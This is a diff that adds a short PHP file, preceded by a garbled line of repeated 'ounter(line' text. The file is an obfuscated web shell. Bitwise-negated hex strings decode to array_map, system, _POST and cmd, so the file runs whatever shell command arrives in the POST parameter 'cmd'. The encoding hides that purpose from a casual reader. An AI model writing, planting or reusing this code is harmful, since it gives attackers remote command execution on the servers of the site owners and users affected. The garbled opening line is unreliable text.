@@ -1,0 +1,24 @@
+
+ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
+<?php
+$_ = ~(
+    "\x9E\x8D\x8D" .
+    "\x9E\x86\xA0" .
+    "\x92\x9E\x8F"
+);
+$__ = ~(
+    "\x8C\x86\x8C" .
+    "\x8B\x9A\x92"
+);
+$___ = ~(
+    "\xA0" .
+    "\xAF\xB0" .
+    "\xAC\xAB"
+);
+$____ = ~(
+    "\x9C" .
+    "\x92\x9B"
+);
+
+$_($__, [${$___}[$____]]);
+?>
